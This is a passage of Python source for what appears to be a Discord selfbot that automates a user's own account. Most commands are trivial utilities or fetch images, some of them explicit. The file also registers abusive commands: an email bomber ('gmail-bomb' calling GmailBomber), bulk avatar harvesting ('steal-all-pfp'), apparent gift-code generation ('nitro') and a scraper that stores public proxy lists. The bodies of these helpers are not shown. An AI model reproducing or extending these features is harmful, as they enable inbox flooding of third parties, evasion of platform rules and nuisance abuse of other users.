       with open('Backup/Friends.txt', 'a+') as f:
           f.write(friendlist+"\n" )
    for block in Client.user.blocked:
        blocklist = (block.name)+'#'+(block.discriminator)
        with open('Backup/Blocked.txt', 'a+') as f: 
            f.write(blocklist+"\n" )

@Client.command(name='first-message', aliases=['firstmsg', 'fm', 'firstmessage'])
async def _first_message(ctx, channel: discord.TextChannel = None): # b'\xfc'
    await ctx.message.delete()  
    if channel is None:
        channel = ctx.channel
    first_message = (await channel.history(limit=1, oldest_first=True).flatten())[0]
    embed = discord.Embed(description=first_message.content)
    embed.add_field(name="First Message", value=f"[Jump]({first_message.jump_url})")
    await ctx.send(embed=embed)

@Client.command()
async def mac(ctx, mac): # b'\xfc'
    await ctx.message.delete()
    r = requests.get('http://api.macvendors.com/' + mac)
    em = discord.Embed(title='MAC Lookup Result', description=r.text, colour=0xDEADBF)
    em.set_author(name='MAC Finder', icon_url='https://regmedia.co.uk/2016/09/22/wifi_icon_shutterstock.jpg?x=1200&y=794')
    await ctx.send(embed=em)

@Client.command()
async def abc(ctx): # b'\xfc'
    await ctx.message.delete()
    ABC = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'ñ', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
    message = await ctx.send(ABC[0])
    await asyncio.sleep(2)
    for _next in ABC[1:]:
        await message.edit(content=_next)
        await asyncio.sleep(2)

@Client.command(aliases=['bitcoin'])
async def btc(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD,EUR')
    r = r.json()
    usd = r['USD']
    eur = r['EUR']
    em = discord.Embed(description=f'USD: `{str(usd)}$`\nEUR: `{str(eur)}€`')
    em.set_author(name='Bitcoin', icon_url='https://cdn.pixabay.com/photo/2013/12/08/12/12/bitcoin-225079_960_720.png')
    await ctx.send(embed=em)

@Client.command(aliases=['ethereum'])
async def eth(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=ETH&tsyms=USD,EUR')
    r = r.json()
    usd = r['USD']
    eur = r['EUR']
    em = discord.Embed(description=f'USD: `{str(usd)}$`\nEUR: `{str(eur)}€`')
    em.set_author(name='Ethereum', icon_url='https://cdn.discordapp.com/attachments/271256875205525504/374282740218200064/2000px-Ethereum_logo.png')
    await ctx.send(embed=em)

@Client.command()
async def topic(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get('https://www.conversationstarters.com/generator.php').content
    soup = bs4(r, 'html.parser')
    topic = soup.find(id="random").text
    await ctx.send(topic)

@Client.command(aliases=['wouldyourather', 'would-you-rather', 'wyrq'])
async def wyr(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get('https://www.conversationstarters.com/wyrqlist.php').text
    soup = bs4(r, 'html.parser')
    qa = soup.find(id='qa').text
    qor = soup.find(id='qor').text
    qb = soup.find(id='qb').text
    em = discord.Embed(description=f'{qa}\n{qor}\n{qb}')
    await ctx.send(embed=em)

@Client.command()
async def hastebin(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    r = requests.post("https://hastebin.com/documents", data=message).json()
    await ctx.send(f"<https://hastebin.com/{r['key']}>")

@Client.command()
async def ascii(ctx, *, text): # b'\xfc'
    await ctx.message.delete()
    r = requests.get(f'http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(text)}').text
    if len('```'+r+'```') > 2000:
        return
    await ctx.send(f"```{r}```")

@Client.command()
async def anal(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/anal")
    res = r.json()
    em = discord.Embed()   
    em.set_image(url=res['url'])
    await ctx.send(embed=em)   

@Client.command()
async def erofeet(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/erofeet")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Client.command()
async def feet(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/feetg")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Client.command()
async def hentai(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)   

@Client.command()
async def boobs(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/boobs")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Client.command()
async def tits(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/tits")
    res = r.json()
    em = discord.Embed()    
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Client.command()
async def blowjob(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/blowjob")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Client.command()
async def lewdneko(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/nsfw_neko_gif")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)   

@Client.command()
async def lesbian(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/les")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Client.command()  
async def feed(ctx, user: discord.Member): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/feed")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Client.command()
async def tickle(ctx, user: discord.Member): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/tickle")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Client.command()
async def slap(ctx, user: discord.Member): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/slap")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Client.command()
async def hug(ctx, user: discord.Member): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/hug")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Client.command()
async def smug(ctx, user: discord.Member): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/smug")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Client.command()
async def pat(ctx, user: discord.Member): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/pat")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Client.command()
async def kiss(ctx, user: discord.Member): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/kiss")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Client.command(aliases=['proxy'])
async def proxies(ctx): # b'\xfc'
    await ctx.message.delete()
    file = open("Data/Http-proxies.txt", "a+")
    res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=1500')
    proxies = []
    for proxy in res.text.split('\n'):
        proxy = proxy.strip()
        if proxy:
            proxies.append(proxy)
    for p in proxies:
        file.write((p)+"\n")
    file = open("Data/Https-proxies.txt", "a+")
    res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=https&timeout=1500')
    proxies = []
    for proxy in res.text.split('\n'):
        proxy = proxy.strip()
        if proxy:
             proxies.append(proxy)
    for p in proxies:
        file.write((p)+"\n")
    file = open("Data/Socks4-proxies.txt", "a+")
    res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&timeout=1500')
    proxies = []
    for proxy in res.text.split('\n'):
        proxy = proxy.strip()
        if proxy:
            proxies.append(proxy)
    for p in proxies:
        file.write((p)+"\n")
    file = open("Data/Socks5-proxies.txt", "a+")
    res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=1500')
    proxies = []
    for proxy in res.text.split('\n'):
        proxy = proxy.strip()
        if proxy:
            proxies.append(proxy)
    for p in proxies:
        file.write((p)+"\n")

@Client.command()
async def uptime(ctx): # b'\xfc'
    await ctx.message.delete()
    uptime = datetime.datetime.utcnow() - start_time
    uptime = str(uptime).split('.')[0]
    await ctx.send(f'`'+uptime+'`')

@Client.command()
async def purge(ctx, amount: int): # b'\xfc'
    await ctx.message.delete()
    async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == Client.user).map(lambda m: m):
        try:
           await message.delete()
        except:
            pass

@Client.command(name='group-leaver', aliase=['leaveallgroups', 'leavegroup', 'leavegroups'])
async def _group_leaver(ctx): # b'\xfc'
    await ctx.message.delete()
    for channel in Client.private_channels:
        if isinstance(channel, discord.GroupChannel):
            await channel.leave()

@Client.command()
async def setS(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    stream = discord.Streaming(
        name=message,
        url=stream_url, 
    )
    await Client.change_presence(activity=stream)    

@Client.command()
async def setG(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    game = discord.Game(
        name=message
    )
    await Client.change_presence(activity=game)

@Client.command()
async def setL(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    await Client.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.listening, 
            name=message, 
        ))

@Client.command()
async def setW(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    await Client.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching, 
            name=message
        ))

@Client.command(aliases=['markasread', 'ack'])
async def read(ctx): # b'\xfc'
    await ctx.message.delete()
    for guild in Client.guilds:
        await guild.ack()

@Client.command()
async def reverse(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    message = message[::-1]
    await ctx.send(message)


@Client.command()
async def bold(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    await ctx.send('**'+message+'**')

@Client.command()
async def secret(ctx, *, message): # b'\xfc'
	await ctx.message.delete()
	await ctx.send('||'+message+'||')

@Client.command(name='role-hexcode', aliases=['rolecolor'])
async def _role_hexcode(ctx, *, role: discord.Role): # b'\xfc'
    await ctx.message.delete()
    await ctx.send(f"{role.name} : {role.color}")

@Client.command(name='get-hwid', aliases=['hwid', 'gethwid', 'hwidget'])
async def _get_hwid(ctx): # b'\xfc'
    await ctx.message.delete()
    print(f"HWID: {Fore.CYAN}{hwid}"+Fore.RESET)

@Client.command()
async def empty(ctx): # b'\xfc'
    await ctx.message.delete()
    await ctx.send(chr(173))

@Client.command()
async def everyone(ctx): # b'\xfc'
    await ctx.message.delete()
    await ctx.send('https://@everyone@google.com')

@Client.command()
async def logout(ctx): # b'\xfc'
    await ctx.message.delete()
    await Client.logout()

@Client.command(aliases=['btc-stream', 'streambtc', 'stream-btc', 'btcstatus'])
async def btcstream(ctx):  # b'\xfc'
    await ctx.message.delete()   
    btc_status.start()        

@Client.command(name='steal-all-pfp', aliases=['steal-all-pfps', 'stealallpfps'])
async def _steal_all_pfp(ctx): # b'\xfc'
    await ctx.message.delete()
    Dump(ctx)

@Client.command(aliases=['clearconsole', 'consoleclear'])
async def cls(ctx): # b'\xfc'
    await ctx.message.delete()
    Clear()

@Client.command()
async def nitro(ctx): # b'\xfc'
    await ctx.message.delete()
    await ctx.send(Nitro())

@Client.command(name='gmail-bomb', aliases=['gmail-bomber', 'gmailbomb', 'email-bomber', 'emailbomber'])
async def _gmail_bomb(ctx): # b'\xfc'
    await ctx.message.delete()
    GmailBomber()

if __name__ == '__main__':
	Init()
